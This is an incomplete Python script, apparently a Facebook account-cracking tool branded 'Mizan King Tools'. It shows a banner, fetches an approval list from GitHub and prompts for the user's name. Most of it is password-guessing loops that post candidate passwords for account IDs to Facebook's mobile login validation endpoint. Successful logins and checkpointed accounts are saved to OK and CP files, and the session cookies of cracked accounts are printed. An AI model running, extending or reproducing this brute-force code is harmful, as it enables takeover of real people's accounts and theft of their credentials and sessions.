...
princp=[]
try:
    prox= requests.get('https://github.com/Mizanunrahman40/Approve/blob/main/Approve.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/Mizanunrahman40/Approve/blob/main/Approve.txt').text
        ua=open('bbnew.txt','w')
...
os.system("xdg-open https://www.facebook.com/mizanur301")
#------------------[ LOGO-LAKNAT ]-----------------#
logo =""" 
║\033[0;37m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;91m  |  \/  |_   _|___  /   /\   | \ | |
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [] AUTHOR    \033[1;91m: \033[1;91mMizanur                      
 ...
 ┃ [] FACEBOOK  \033[1;92m: \033[1;92mMizan🔥                 
 ┃ [] VIRSON    \033[1;92m: \033[1;32m[1.3]\033[0;32m
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"""
os.system('clear')
print(logo)
os.system('espeak -a 300 " Your,   Real,  Name,"')
uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  Mizan,  King,  Tools"')
pass
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Mizan-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Mizan-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Mizan,  Ok,  id"')
...
def crackfree(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Mizan-Cp🫢] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Mizan-Ok🌺] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  Mizan,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
